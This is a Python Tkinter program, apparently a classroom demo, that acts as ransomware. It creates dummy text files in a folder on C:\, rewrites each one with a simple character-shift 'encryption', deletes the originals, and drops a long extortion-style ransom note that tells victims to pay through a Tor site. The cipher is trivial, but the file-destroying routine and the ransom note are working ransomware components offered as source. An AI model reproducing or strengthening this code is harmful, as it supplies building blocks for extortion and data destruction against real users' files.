
import os
# import sys
import tkinter as tk
import glob

# try:
#     CURRENT_FILE_LOCATION = __file__
# except NameError:
#     CURRENT_FILE_LOCATION = sys.argv[0]

ROOT_DIR = 'C:\\'   # os.path.dirname(CURRENT_FILE_LOCATION)

VULNERABLE_DIRECTORY = os.path.join(ROOT_DIR, 'my_important_documents')
RNASOMWARE_EXTENSION = 'encrypt'
RANSOMWARE_NOTE_FILENAME = 'HOW TO DECRYPT FILES.TXT'
RANSOMWARE_NOTE = '''
###########################################
Cannot you find the files you need?
Is the content of the files that you looked for not readable?
It is normal because the files' names, as well as the data in your files have been encrypted.
###########################################
!!! If you are reading this message it means the software
!!! "Alpha Ransomware" has been removed from your computer.
###########################################
What is encryption?
-------------------
Encryption is a reversible modification of information for security
reasons but providing full access to it for authorized users.
To become an authorized user and keep the modification absolutely
reversible (in other words to have a possibility to decrypt your files)
you should have an individual private key.
But not only it.
It is required also to have the special decryption software
(in your case "Alpha Decryptor" software) for safe and complete
decryption of all your files and data.
############################################
Everything is clear for me but what should I do?
------------------------------------------------
The first step is reading these instructions to the end.
Your files have been encrypted with the "Alpha Ransomware" software; the
instructions ("HOW TO DECRYPT FILES.TXT" and "HOW TO DECRYPT FILES.HTML")
in the folders with your encrypted files are not viruses, they will
help you.
After reading this text the most part of people start searching in the
Internet the words the "Alpha Ransomware" where they find a lot of
ideas, recommendations and instructions.
It is necessary to realize that we are the ones who closed the lock on
your files and we are the only ones who have this secret key to
open them.
!!! Any attempts to get back your files with the third-party tools can
!!! be fatal for your encrypted files.
The most part of the third-party software change data within the
encrypted file to restore it but this causes damage to the files.
Finally it will be impossible to decrypt your files.
When you make a puzzle but some items are lost, broken or not put in its
place - the puzzle items will never match, the same way the third-party
software will ruin your files completely and irreversibly.
You should realize that any intervention of the third-party software to
restore files encrypted with the "Alpha Ransomware" software may be
fatal for your files.
####################################
!!! There are several plain steps to restore your files but if you do
!!! not follow them we will not be able to help you, and we will not try
!!! since you have read this warning already.
####################################
For your information the software to decrypt your files (as well as the
private key provided together) are paid products.
After purchase of the software package you will be able to:
1. decrypt all your files;
2. work with your documents;
3. view your photos and other media;
4. continue your usual and comfortable work at the computer.
If you understand all importance of the situation then we propose to you
to go directly to your personal page where you will receive the complete
instructions and guarantees to restore your files.
######################################
If you need our help:
1. run your Internet browser (if you do not know what it is run the Internet Explorer);
2. enter or copy the address https://www.torproject.org/download/download-easy.html.en into the address bar of your browser and press ENTER;
3. wait for the site loading;
4. on the site you will be offered to download Tor Browser; download and run it, follow the installation instructions, wait until the installation is completed;
5. run Tor Browser;
6. connect with the button "Connect" (if you use the English version);
7. a normal Internet browser window will be opened after the initialization;
8. type or copy the address in this browser address bar;
9. press ENTER;
10. the site should be loaded; if for some reason the site is not loading wait for a moment and try again.
11. enter your personal key:
12. press ENTER;
If you have any problems during installation or operation of Tor Browser,
please, visit https://www.youtube.com/ and type request in the search bar
"install tor browser windows" and you will find a lot of training videos
about Tor Browser installation and operation.
If TOR address is not available for a long period (2-3 days) it means you
are late; usually you have about 2-3 weeks after reading the instructions
to restore your files.
#######################################
Additional information:
You will find the instructions for restoring your files in those folders
where you have your encrypted files only.
The instructions are made in two file formats - HTML and TXT for
your convenience.
Unfortunately antivirus companies cannot protect or restore your files
but they can make the situation worse removing the instructions how to
restore your encrypted files.
The instructions are not viruses; they have informative nature only, so
any claims on the absence of any instruction files you can send to your
antivirus company.
########################################
Alpha Ransomware Project is not malicious and is not intended to harm a
person and his/her information data.
The project is created for the sole purpose of instruction regarding
information security, as well as certification of antivirus software for
their suitability for data protection.
Together we make the Internet a better and safer place.
#########################################
If you look through this text in the Internet and realize that something
is wrong with your files but you do not have any instructions to restore
your files, please, contact your antivirus support.
#########################################
Remember that the worst situation already happened and now it depends on
your determination and speed of your actions the further life of
your files.
*******************************
'''


root = tk.Tk()
frame = tk.Frame(root)
frame.pack()

error_messages = tk.StringVar()
error_messages.set('    ')


def prepare_for_demo():
    print("Preparing for demo...")
    try:
        os.makedirs(VULNERABLE_DIRECTORY)
    except:
        pass   # unable to create directory

    for i in range(1000):
        with open(os.path.join(VULNERABLE_DIRECTORY, 'doc_{}.txt'.format(i)), 'w+') as f:
            f.write(str(i))


def encrypt_string(s):
    return "".join([chr(60+ord(x)) for x in s])

def execute_ransomware():
    print("Executing ransomware...")

    try:
        print(os.path.join(ROOT_DIR, RANSOMWARE_NOTE_FILENAME))
        with open(os.path.join(ROOT_DIR, RANSOMWARE_NOTE_FILENAME), 'w+') as f:
            f.write(RANSOMWARE_NOTE)
    except Exception as e:
        print(str(e))

    print(os.path.join(VULNERABLE_DIRECTORY, '*.txt'))
    for fname in glob.glob(os.path.join(VULNERABLE_DIRECTORY, '*.txt')):
        with open(fname, 'r') as f:
            en = encrypt_string(f.read())
            with open("{}.{}".format(fname, RNASOMWARE_EXTENSION), 'w') as fnew:
                fnew.write(en)
        os.remove(fname)
    
    print(os.path.join(VULNERABLE_DIRECTORY, RANSOMWARE_NOTE_FILENAME))
    with open(os.path.join(VULNERABLE_DIRECTORY, RANSOMWARE_NOTE_FILENAME), 'w+') as f:
        f.write(RANSOMWARE_NOTE)

    root.destroy()


tk.Label(frame, textvariable=error_messages).pack(side=tk.TOP, pady=10)

btn_prepare = tk.Button(frame,
                text="Prepare for Demo", 
                command=prepare_for_demo
                )
btn_prepare.pack(side=tk.LEFT, pady=10)

btn_execute = tk.Button(frame,
                text="Execute Ransomware",
                command=execute_ransomware)
btn_execute.pack(side=tk.RIGHT, pady=10)


root.mainloop()
